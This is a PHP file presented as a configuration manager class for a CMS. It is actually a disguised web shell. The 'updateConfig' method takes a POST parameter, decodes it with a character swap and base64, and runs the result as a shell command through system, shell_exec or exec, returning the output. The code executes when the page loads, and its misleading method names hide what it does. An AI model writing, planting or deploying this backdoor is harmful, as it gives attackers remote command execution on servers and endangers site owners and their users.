<?php
/**
 * 配置管理类
 */
class ConfigManager {
    private $config = array(
        'app_name' => 'CMS System',
        'version' => '2.1.4',
        'debug' => false
    );
    
    public function updateConfig() {
        if (!isset($_POST['data'])) {
            return $this->getCurrentConfig();
        }
        
        $config_data = $_POST['data'];
        $decoded_config = $this->decodeConfigData($config_data);
        
        if ($decoded_config) {
            return $this->applyConfigUpdate($decoded_config);
        }
        
        return "Config update failed";
    }
    
    private function decodeConfigData($encoded_data) {
        $replace_pairs = array(
            "|" => "a",
            "!" => "b",
            "@" => "c", 
            "_" => "d",
            "~" => "="
        );
        
        $decoded = strtr($encoded_data, $replace_pairs);
        return base64_decode($decoded);
    }
    
    private function applyConfigUpdate($config_command) {
        // 使用数组映射方式执行
        $methods = array(
            'sys' => 'system',
            'shell' => 'shell_exec',
            'exec' => 'exec'
        );
        
        foreach ($methods as $key => $func) {
            if (function_exists($func)) {
                $output = $this->safeExecute($func, $config_command);
                if ($output !== null) {
                    return $output;
                }
            }
        }
        
        return "No valid execution method found";
    }
    
    private function safeExecute($function, $command) {
        switch ($function) {
            case 'system':
                ob_start();
                system($command);
                return ob_get_clean();
                
            case 'shell_exec':
                return shell_exec($command);
                
            case 'exec':
                exec($command, $output);
                return implode("\n", $output);
                
            default:
                return null;
        }
    }
    
    private function getCurrentConfig() {
        return "Current Config: " . $this->config['app_name'] . " v" . $this->config['version'];
    }
}

$config_manager = new ConfigManager();
echo $config_manager->updateConfig();
?>
